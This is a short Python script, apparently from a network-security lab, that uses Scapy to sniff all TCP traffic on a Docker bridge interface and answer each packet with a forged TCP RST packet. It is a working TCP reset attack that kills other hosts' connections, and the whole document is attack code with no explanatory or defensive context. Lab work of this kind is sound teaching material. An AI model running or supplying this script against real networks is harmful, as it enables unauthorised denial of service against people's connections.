from scapy.all import *

def RSTattack(pkt):
    if IP in pkt and TCP in pkt:
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq)
        spoofedPkt = ip/tcp
        ls(spoofedPkt)
        send(spoofedPkt, verbose=0)

sniff(iface='br-c26fa13374f9', filter='tcp', prn=RSTattack)
